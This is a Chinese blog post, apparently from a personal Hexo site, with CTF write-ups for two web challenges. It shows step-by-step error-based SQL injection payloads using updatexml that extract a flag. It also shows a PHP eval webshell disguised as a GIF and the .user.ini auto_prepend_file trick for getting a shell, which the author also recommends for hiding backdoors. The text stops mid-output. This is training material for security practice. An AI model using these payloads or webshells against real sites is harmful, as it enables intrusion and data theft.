@@ -1,0 +1,512 @@
+<!DOCTYPE html><html class="hide-aside" lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>BUU刷题记4 | Kanyun's Blog</title><meta name="keywords" content="CTF_WEB"><meta name="author" content="kanyun"><meta name="copyright" content="kanyun"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[极客大挑战 2019]HardSQL题目环境： 解题思路：万能密码：1&#39; or 1&#x3D;1#   过滤了and、&#x3D;、空格、union、双写  等 尝试报错注入：报错注入使用场景 适合无直接回显的sql注入，存在报错页面的回显   有两个报错注入函数：  extractvalue() updatexml()    一、extractvalue函数1.函数含义： 使用 XPath 表示">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUU刷题记4">
+<meta property="og:url" content="https://kannikanyun.github.io/2022/06/27/BUU%E5%88%B7%E9%A2%98%E8%AE%B04/index.html">
+<meta property="og:site_name" content="Kanyun&#39;s Blog">
+<meta property="og:description" content="[极客大挑战 2019]HardSQL题目环境： 解题思路：万能密码：1&#39; or 1&#x3D;1#   过滤了and、&#x3D;、空格、union、双写  等 尝试报错注入：报错注入使用场景 适合无直接回显的sql注入，存在报错页面的回显   有两个报错注入函数：  extractvalue() updatexml()    一、extractvalue函数1.函数含义： 使用 XPath 表示">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731042.jpg">
+<meta property="article:published_time" content="2022-06-27T09:47:28.000Z">
+<meta property="article:modified_time" content="2022-06-28T03:23:06.839Z">
+<meta property="article:author" content="kanyun">
+<meta property="article:tag" content="CTF_WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731042.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://kannikanyun.github.io/2022/06/27/BUU%E5%88%B7%E9%A2%98%E8%AE%B04/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'BUU刷题记4',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-06-28 11:23:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/myWordCss.css"><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Kanyun's Blog" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206131634016.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/diary/"><i class="fa-fw fas fa-diary"></i><span> 笔记</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731042.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Kanyun's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/diary/"><i class="fa-fw fas fa-diary"></i><span> 笔记</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUU刷题记4</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-06-27T09:47:28.000Z" title="发表于 2022-06-27 17:47:28">2022-06-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-06-28T03:23:06.839Z" title="更新于 2022-06-28 11:23:06">2022-06-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BUU刷题记4"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><h2 id="题目环境："><a href="#题目环境：" class="headerlink" title="题目环境："></a>题目环境：</h2><p><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271421152.png" alt="image-20220627142124035"></p>
+<h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><h3 id="万能密码："><a href="#万能密码：" class="headerlink" title="万能密码："></a>万能密码：</h3><pre class="line-numbers language-none"><code class="language-none">1&#39; or 1&#x3D;1#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271425867.png" alt="image-20220627142554763"></p>
+<p>过滤了and、=、空格、union、双写  等</p>
+<h3 id="尝试报错注入："><a href="#尝试报错注入：" class="headerlink" title="尝试报错注入："></a>尝试报错注入：</h3><h4 id="报错注入使用场景"><a href="#报错注入使用场景" class="headerlink" title="报错注入使用场景"></a>报错注入使用场景</h4><ul>
+<li><p>适合无直接回显的sql注入，存在报错页面的回显</p>
+<blockquote>
+<blockquote>
+<p>有两个报错注入函数：</p>
+<ol>
+<li>extractvalue()</li>
+<li>updatexml()</li>
+</ol>
+</blockquote>
+</blockquote>
+<h5 id="一、extractvalue函数"><a href="#一、extractvalue函数" class="headerlink" title="一、extractvalue函数"></a>一、extractvalue函数</h5><p>1.函数含义： 使用 XPath 表示法从 XML 字符串中提取值，即返回的是一个字符串。</p>
+<p>2.用法</p>
+<ul>
+<li>ExtractValue(xml_frag, xpath_expr)<br>两个字符串参数：<br>(1). xml_frag: XML 标记片段，xml语言的标签闭合内的值，<br>(2). xpath_expr: XPath 表达式，匹配xml标签内的值并返回。<br>例如，</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">ExtractValue(&#39;&lt;a&gt;ccc&lt;b&gt;ddd&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&#39;, &#39;&#x2F;a&#39;) AS val1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>val1的值为ccc，而不为ddd，因为a标签中闭合的是ccc，<br>若是想匹配值为ddd，则如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">ExtractValue(&#39;&lt;a&gt;ccc&lt;b&gt;ddd&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&#39;, &#39;&#x2F;&#x2F;b&#39;) AS val2;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>此时val2的值为ddd。</p>
+<p>3.报错注入使用场景</p>
+<ul>
+<li>适合无直接回显的sql注入，存在报错页面的回显</li>
+</ul>
+<p>4.报错的原因</p>
+<blockquote>
+<p>ExtractValue函数中的两个参数，得是xpath语法才会正常回显，如果不是xpath语法，则会报错并回显。</p>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>extractvalue报错会返回其中的sql语句结果。</p>
+</blockquote>
+</blockquote>
+<p>5.配合函数<br>原因：报错注入会限制数据库内容不超过32字节，所以灵活使用一些函数来截取数据内容，最后再进行拼接。</p>
+<ul>
+<li>mid函数： 返回从指定位置开始的子字符串</li>
+<li>substr函数：返回指定的子字符串</li>
+<li>concat函数： 返回连接的字符串</li>
+</ul>
+<p>6.常用peayload：<br>例子：CVE-2020-5504 phpmyadmin的后台sql注入（狗头保命，都sql的管理后台了，还在这注入呢）</p>
+<ul>
+<li>数据库</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="我们选择："><a href="#我们选择：" class="headerlink" title="我们选择："></a>我们选择：</h3></li>
+</ul>
+<blockquote>
+<p>使用updatexml报错注入</p>
+</blockquote>
+<p><code>updatexml</code>函数与<code>extractvalue</code>函数用法一样</p>
+<pre class="line-numbers language-none"><code class="language-none">updatexml(a,b,c)，此函数a，c必须为String类型，因此可以使a,c不为String型进行报错<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="Payload1-查看版本"><a href="#Payload1-查看版本" class="headerlink" title="Payload1(查看版本):"></a>Payload1(查看版本):</h4><p><code>username=admin&#39;or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&amp;password=21</code></p>
+<blockquote>
+<p><code>XPATH syntax error: &#39;~10.3.18-MariaDB~&#39;</code></p>
+</blockquote>
+<h4 id="Payload2-爆库"><a href="#Payload2-爆库" class="headerlink" title="Payload2(爆库):"></a>Payload2(爆库):</h4><p><code>username=admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=1</code></p>
+<blockquote>
+<p><code>XPATH syntax error: &#39;~geek~&#39;</code></p>
+</blockquote>
+<h4 id="Payload3-爆表"><a href="#Payload3-爆表" class="headerlink" title="Payload3(爆表):"></a>Payload3(爆表):</h4><p><code>username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=21</code></p>
+<blockquote>
+<p><code>XPATH syntax error: &#39;~H4rDsq1~&#39;</code></p>
+</blockquote>
+<h4 id="Payload4-爆字段名"><a href="#Payload4-爆字段名" class="headerlink" title="Payload4(爆字段名):"></a>Payload4(爆字段名):</h4><p><code>username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))%23</code><br><code>&amp;password=21</code></p>
+<blockquote>
+<p><code>XPATH syntax error: &#39;~id,username,password~&#39;</code></p>
+</blockquote>
+<h4 id="Payload5-爆字段值"><a href="#Payload5-爆字段值" class="headerlink" title="Payload5(爆字段值):"></a>Payload5(爆字段值):</h4><p><code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(username,&#39;--&#39;,password))from(H4rDsq1)),0x7e),1))%23&amp;password=1</code></p>
+<blockquote>
+<p><code>XPATH syntax error: &#39;~flag--flag&#123;a007ebd8-50c7-495f-b&#39;</code></p>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>flag并没有完全显示</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>right()查询后半段</p>
+<h2 id="RIGHT-str-len"><a href="#RIGHT-str-len" class="headerlink" title="RIGHT(str,len)"></a>RIGHT(str,len)</h2><p>​    返回最右侧的n个字符的字符串str，或NULL如果任何参数是NULL                                                     </p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SQL</span><span class="token operator">></span> <span class="token keyword">SELECT</span> <span class="token keyword">RIGHT</span><span class="token punctuation">(</span><span class="token string">'foobarbar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">---------------------------------------------------------+</span>
+<span class="token operator">|</span> <span class="token keyword">RIGHT</span><span class="token punctuation">(</span><span class="token string">'foobarbar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>                                   <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">---------------------------------------------------------+</span>
+<span class="token operator">|</span> rbar                                                    <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">---------------------------------------------------------+</span>
+<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<h4 id="Payload6-查右半段flag"><a href="#Payload6-查右半段flag" class="headerlink" title="Payload6(查右半段flag):"></a>Payload6(查右半段flag):</h4><p><code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,30))))from(H4rDsq1)),0x7e),1))%23&amp;password=1</code></p>
+<blockquote>
+<p><code>XPATH syntax error: &#39;~8-50c7-495f-b702-058e970280f2&#125;~&#39;</code></p>
+</blockquote>
+<h4 id="flag拼接得："><a href="#flag拼接得：" class="headerlink" title="flag拼接得："></a>flag拼接得：</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">flag<span class="token punctuation">&#123;</span>a007ebd8<span class="token operator">-</span><span class="token number">50</span>c7<span class="token operator">-</span><span class="token number">495</span>f<span class="token operator">-</span>b702<span class="token operator">-</span><span class="token number">058e970280</span>f2<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol>
+<li><p>在无回显的情况下，选择报错注入—-updatexml()</p>
+</li>
+<li><blockquote>
+<p>原因：格式简单😂</p>
+</blockquote>
+</li>
+<li><p>在GET传参时注意  <code>&#39;</code>  –&gt;%27  、  <code>#</code>  –&gt; %23</p>
+</li>
+<li><p>sql中的right()函数，可从右显示字段值</p>
+</li>
+</ol>
+<hr>
+<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h2 id="题目环境：-1"><a href="#题目环境：-1" class="headerlink" title="题目环境："></a>题目环境：</h2><p><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271911961.png" alt="image-20220627191110906"></p>
+<p>是一个文件上传的界面，很明显这是关于<strong>文件上传漏洞</strong>方面的题目。</p>
+<h2 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h2><h3 id="尝试一句话木马："><a href="#尝试一句话木马：" class="headerlink" title="尝试一句话木马："></a>尝试一句话木马：</h3><p><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271945574.png" alt="image-20220627194516522"></p>
+<blockquote>
+<p>提示：<u><em><strong>非法的后缀</strong></em></u></p>
+</blockquote>
+<h3 id="尝试绕过-lt-的图片马："><a href="#尝试绕过-lt-的图片马：" class="headerlink" title="尝试绕过&lt;?的图片马："></a>尝试绕过&lt;?的图片马：</h3><blockquote>
+<p><code>&lt;? in contents!</code></p>
+</blockquote>
+<blockquote>
+<p> 提示包含了&lt;?   ,   表示过滤了含有“&lt;?”的文件</p>
+</blockquote>
+<h3 id="尝试绕过-lt"><a href="#尝试绕过-lt" class="headerlink" title="尝试绕过&lt;?"></a>尝试绕过&lt;?</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>回显：<code>exif_imagetype:not image!</code></p>
+</blockquote>
+<h3 id="exif-imagetype"><a href="#exif-imagetype" class="headerlink" title="exif_imagetype"></a>exif_imagetype</h3><blockquote>
+<ol>
+<li><p>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</p>
+</li>
+<li><p>exif_imagetype — 判断一个图像的类型</p>
+<p><em><strong><u>说明:</u></strong></em></p>
+</li>
+<li><p>exif_imagetype ( string $filename ) : int</p>
+</li>
+<li><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p>
+</li>
+<li><p><u><em><strong>说明题目后端会截取上传的文件的头部一部分进行判断是否为图像文件</strong></em></u></p>
+</li>
+</ol>
+</blockquote>
+<h3 id="GIF89a图片头文件欺骗，"><a href="#GIF89a图片头文件欺骗，" class="headerlink" title="GIF89a图片头文件欺骗，"></a><strong>GIF89a图片头文件欺骗，</strong></h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">?</span>
+<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p> 回显：</p>
+<blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">Your dir uploads<span class="token operator">/</span>c47b21fcf8f0bc8b3920541abd8024fd
+Your files <span class="token punctuation">:</span>
+<span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"."</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">".."</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"GIF89a .png"</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"index.php"</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>图片马是上去啦，但是服务器并不会执行里面的代码</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>因此这里涉及另一个知识点：</p>
+</blockquote>
+<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a><strong>文件包含漏洞</strong></h3><h4 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h4><p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p>
+<p><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://img-blog.csdnimg.cn/20210205232411887.png" alt="img"></p>
+<ol>
+<li><blockquote>
+<p>auto_prepend_file，指定一个文件，自动包含在要执行的文件*<u><strong>前</strong></u>*，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>```ini<br>GIF89a                  //绕过exif_imagetype()<br>auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。<br>auto_append_file=a.jpg  //解析后进行包含</p>
+<pre class="line-numbers language-none"><code class="language-none">
+&#96;GIF89a.png&#96;是要包含的文件。
+
+3. &gt; 因此，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。
+
+&gt; 优势：跟&#96;.htaccess&#96;后门比，适用范围更广，nginx&#x2F;apache&#x2F;IIS都有效，而&#96;.htaccess&#96;只适用于apache
+
+#### 使用场景：
+
+**某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。**
+
+### Payload1:上传user.ini
+
+&#96;&#96;&#96;ini
+GIF89a
+auto_prepend_file&#x3D;GIF89a.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote>
+</li>
+</ol>
+<blockquote>
+<p>前面加GIF89a，来绕过检测</p>
+</blockquote>
+<p>回显：</p>
+<blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">Your dir uploads<span class="token operator">/</span>c47b21fcf8f0bc8b3920541abd8024fd 
+Your files <span class="token punctuation">:</span> 
